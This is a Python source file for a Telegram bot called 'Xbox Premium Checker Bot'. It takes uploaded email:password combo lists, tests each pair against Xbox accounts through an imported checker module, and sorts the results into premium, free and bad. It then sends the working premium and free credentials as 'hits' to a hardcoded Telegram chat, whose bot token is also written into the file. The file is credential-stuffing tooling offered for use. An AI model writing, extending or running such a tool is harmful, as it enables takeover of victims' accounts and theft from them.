import os
import sys
import time
import threading
import queue
import asyncio
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
import traceback

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Import original checker - DO NOT MODIFY THIS IMPORT
# Assuming original code is in checker.py
import checker

# Telegram Configuration
BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
CHAT_ID = 8260250818

# Global variables
task_queue = queue.Queue()
processing_active = False
current_task = None
user_data = {}
processing_lock = threading.Lock()

class TaskStatus:
    PENDING = "pending"
    PROCESSING = "processing"
    COMPLETED = "completed"
    FAILED = "failed"

class ScanTask:
    def __init__(self, file_path, original_name, file_id, chat_id):
        self.file_path = file_path
        self.original_name = original_name
        self.file_id = file_id
        self.chat_id = chat_id
        self.status = TaskStatus.PENDING
        self.result = None
        self.created_at = datetime.now()
        self.completed_at = None

def run_checker_on_file(file_path, status_callback=None):
    """
    Run the original checker code on a file
    This function executes the original code's main logic without modification
    """
    try:
        # Create a temporary directory for results
        temp_results_dir = tempfile.mkdtemp()
        original_results_path = "/storage/emulated/0/xbox_results"
        
        # Monkey patch the original code's file paths to use temp directory
        original_ResultManager_init = checker.ResultManager.__init__
        
        def patched_init(self, combo_filename):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.base_folder = os.path.join(temp_results_dir, timestamp + "_" + combo_filename)
            self.premium_folder = os.path.join(self.base_folder, "premium")
            self.free_folder = os.path.join(self.base_folder, "free")
            self.bad_folder = os.path.join(self.base_folder, "bad")
            Path(self.premium_folder).mkdir(parents=True, exist_ok=True)
            Path(self.free_folder).mkdir(parents=True, exist_ok=True)
            Path(self.bad_folder).mkdir(parents=True, exist_ok=True)
            self.premium_file = os.path.join(self.premium_folder, "premium_accounts.txt")
            self.free_file = os.path.join(self.free_folder, "free_accounts.txt")
            self.bad_file = os.path.join(self.bad_folder, "bad_accounts.txt")
            self.telegram = checker.TelegramSender()
        
        # Apply monkey patch
        checker.ResultManager.__init__ = patched_init
        
        # Override the Telegram token in the original code
        checker.TELEGRAM_BOT_TOKEN = BOT_TOKEN
        checker.TELEGRAM_CHAT_ID = str(CHAT_ID)
        
        # Create a modified stdout to capture output for status updates
        class OutputCapture:
            def __init__(self, callback):
                self.callback = callback
                self.buffer = ""
            
            def write(self, text):
                self.buffer += text
                if "\n" in text:
                    if self.callback:
                        self.callback(self.buffer.strip())
                    self.buffer = ""
            
            def flush(self):
                pass
        
        # Redirect stdout temporarily
        original_stdout = sys.stdout
        sys.stdout = OutputCapture(status_callback)
        
        try:
            # Create a temporary combo file
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Run the main logic from the original code
            # We need to emulate the __main__ block
            lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
            
            if not lines:
                return {"error": "No valid accounts in file"}
            
            # Create stats tracker
            stats = {
                "total": len(lines),
                "checked": 0,
                "premium": 0,
                "free": 0,
                "bad": 0,
                "errors": 0
            }
            
            # Run checker on each account
            result_manager = checker.ResultManager(os.path.basename(file_path).replace('.txt', ''))
            
            for line in lines:
                try:
                    if ':' not in line:
                        stats["bad"] += 1
                        stats["checked"] += 1
                        continue
                    parts = line.split(':', 1)
                    email = parts[0].strip()
                    password = parts[1].strip()
                    xbox_checker = checker.XboxChecker(debug=False)
                    result = xbox_checker.check(email, password)
                    status = result['status']
                    
                    if status == "PREMIUM":
                        stats["premium"] += 1
                    elif status == "FREE":
                        stats["free"] += 1
                    else:
                        stats["bad"] += 1
                    
                    result_manager.save_result(email, password, result)
                    stats["checked"] += 1
                    
                    if status_callback:
                        status_callback(f"Progress: {stats['checked']}/{stats['total']} | Premium: {stats['premium']} | Free: {stats['free']} | Bad: {stats['bad']}")
                        
                except Exception as e:
                    stats["bad"] += 1
                    stats["checked"] += 1
                    if status_callback:
                        status_callback(f"Error on {line[:30]}: {str(e)[:50]}")
            
            # Collect results
            results = {
                "status": "success",
                "stats": stats,
                "premium_file": result_manager.premium_file,
                "free_file": result_manager.free_file,
                "bad_file": result_manager.bad_file,
                "temp_dir": temp_results_dir
            }
            
            return results
            
        finally:
            # Restore stdout
            sys.stdout = original_stdout
            # Restore original init
            checker.ResultManager.__init__ = original_ResultManager_init
            
    except Exception as e:
        return {"status": "error", "error": str(e), "traceback": traceback.format_exc()}

def process_queue():
    """Process tasks from queue sequentially"""
    global processing_active, current_task
    
    while True:
        try:
            if task_queue.empty():
                with processing_lock:
                    processing_active = False
                    current_task = None
                time.sleep(1)
                continue
            
            with processing_lock:
                current_task = task_queue.get()
                processing_active = True
            
            current_task.status = TaskStatus.PROCESSING
            
            # Send start message
            asyncio.run_coroutine_threadsafe(
                send_processing_start(current_task),
                loop
            )
            
            # Define status callback for real-time updates
            def status_callback(message):
                asyncio.run_coroutine_threadsafe(
                    send_processing_update(current_task, message),
                    loop
                )
            
            # Run checker
            result = run_checker_on_file(current_task.file_path, status_callback)
            
            if result.get("status") == "success":
                current_task.result = result
                current_task.status = TaskStatus.COMPLETED
                
                # Read results files
                premium_content = ""
                free_content = ""
                
                try:
                    with open(result["premium_file"], 'r') as f:
                        premium_content = f.read()
                except:
                    pass
                
                try:
                    with open(result["free_file"], 'r') as f:
                        free_content = f.read()
                except:
                    pass
                
                # Send final receipt
                asyncio.run_coroutine_threadsafe(
                    send_final_receipt(current_task, result["stats"], premium_content, free_content),
                    loop
                )
            else:
                current_task.status = TaskStatus.FAILED
                current_task.result = result
                asyncio.run_coroutine_threadsafe(
                    send_error_message(current_task, result.get("error", "Unknown error")),
                    loop
                )
            
            # Cleanup temp files
            if result and result.get("temp_dir"):
                try:
                    shutil.rmtree(result["temp_dir"])
                except:
                    pass
            
            # Mark task as done
            task_queue.task_done()
            
        except Exception as e:
            if current_task:
                current_task.status = TaskStatus.FAILED
                asyncio.run_coroutine_threadsafe(
                    send_error_message(current_task, str(e)),
                    loop
                )
                task_queue.task_done()
            time.sleep(1)

async def send_processing_start(task):
    """Send message when processing starts"""
    message = (
        f"🚀 **Processing Started**\n\n"
        f"📄 File: `{task.original_name}`\n"
        f"⏰ Started: {task.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"🔄 Loading accounts...\n"
        f"⏳ Please wait while scanning in progress..."
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def send_processing_update(task, update_text):
    """Send real-time progress updates"""
    try:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"📊 {update_text}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

async def send_final_receipt(task, stats, premium_content, free_content):
    """Send final results receipt"""
    
    # Create receipt message
    receipt = (
        f"✅ **SCAN COMPLETE**\n\n"
        f"📄 **File:** `{task.original_name}`\n"
        f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f} seconds\n\n"
        f"📊 **RESULTS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 **Total:** `{stats['total']}`\n"
        f"✅ **HIT (PREMIUM):** `{stats['premium']}`\n"
        f"🆓 **FREE:** `{stats['free']}`\n"
        f"❌ **BAD:** `{stats['bad']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
    
    # Send premium accounts if any
    if stats['premium'] > 0 and premium_content:
        premium_msg = f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n"
        premium_msg += f"```\n{premium_content[:4000]}\n```"
        if len(premium_content) > 4000:
            premium_msg += "\n*(truncated, check full log)*"
        
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=premium_msg,
            parse_mode=ParseMode.MARKDOWN
        )
    
    # Send free accounts if any and not too many
    if stats['free'] > 0 and stats['free'] <= 50 and free_content:
        free_msg = f"🆓 **FREE ACCOUNTS ({stats['free']})**\n\n"
        free_msg += f"```\n{free_content[:3000]}\n```"
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=free_msg,
            parse_mode=ParseMode.MARKDOWN
        )
    
    # Queue next file message
    remaining = task_queue.qsize()
    if remaining > 0:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"📁 **Next in queue:** {remaining} file(s) waiting\n⏳ Processing will continue automatically...",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text="✨ **Queue empty!** Send more .txt files to scan.",
            parse_mode=ParseMode.MARKDOWN
        )

async def send_error_message(task, error):
    """Send error message"""
    message = (
        f"❌ **ERROR**\n\n"
        f"📄 File: `{task.original_name}`\n"
        f"🔴 Status: Failed\n\n"
        f"**Error:**\n`{error[:500]}`"
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_msg = (
        "🤖 **Xbox Premium Checker Bot**\n\n"
        "Send me a `.txt` file with accounts in `email:password` format\n\n"
        "**Features:**\n"
        "• Automatic scanning\n"
        "• Queue system for multiple files\n"
        "• Real-time progress updates\n"
        "• Premium accounts sent instantly\n"
        "• Full results receipt\n\n"
        "**Commands:**\n"
        "/start - Show this message\n"
        "/status - Check queue status\n"
        "/cancel - Cancel current scan\n\n"
        "Send any .txt file to begin!"
    )
    await update.message.reply_text(welcome_msg, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    with processing_lock:
        queue_size = task_queue.qsize()
        is_processing = processing_active
    
    if is_processing and current_task:
        msg = (
            f"📊 **Queue Status**\n\n"
            f"🔄 **Processing:** `{current_task.original_name}`\n"
            f"⏳ **Queue Size:** `{queue_size}` files\n"
            f"📅 Started: {current_task.created_at.strftime('%H:%M:%S')}"
        )
    else:
        msg = (
            f"📊 **Queue Status**\n\n"
            f"💤 **Idle** - No active scans\n"
            f"⏳ **Queue Size:** `{queue_size}` files\n\n"
            f"Send a .txt file to start!"
        )
    
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command"""
    global processing_active
    
    with processing_lock:
        if processing_active and current_task:
            processing_active = False
            msg = f"🛑 Cancelled scan for `{current_task.original_name}`"
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("No active scan to cancel.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming .txt files"""
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file with accounts in `email:password` format.")
        return
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    
    # Create temp file
    temp_dir = tempfile.mkdtemp()
    temp_path = os.path.join(temp_dir, document.file_name)
    await file.download_to_drive(temp_path)
    
    # Validate file content
    try:
        with open(temp_path, 'r', encoding='utf-8') as f:
            content = f.read()
            lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
            
        if not lines:
            await update.message.reply_text("❌ File contains no valid `email:password` lines.")
            shutil.rmtree(temp_dir)
            return
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
        shutil.rmtree(temp_dir)
        return
    
    # Create task
    task = ScanTask(
        file_path=temp_path,
        original_name=document.file_name,
        file_id=document.file_id,
        chat_id=update.effective_chat.id
    )
    
    # Add to queue
    task_queue.put(task)
    
    queue_size = task_queue.qsize()
    
    await update.message.reply_text(
        f"✅ **File queued successfully!**\n\n"
        f"📄 `{document.file_name}`\n"
        f"🔢 Accounts: `{len(lines)}`\n"
        f"📊 Position: `{queue_size}` in queue\n\n"
        f"Use /status to check progress.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Start processing if not already running
    with processing_lock:
        if not processing_active:
            thread = threading.Thread(target=process_queue, daemon=True)
            thread.start()

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Error: {context.error}")
    if update and update.effective_chat:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ An error occurred. Please try again."
        )

def main():
    """Main entry point"""
    global app, loop
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_error_handler(error_handler)
    
    # Start bot
    print("🤖 Bot started! Waiting for files...")
    app.run_polling()

if __name__ == "__main__":
    main()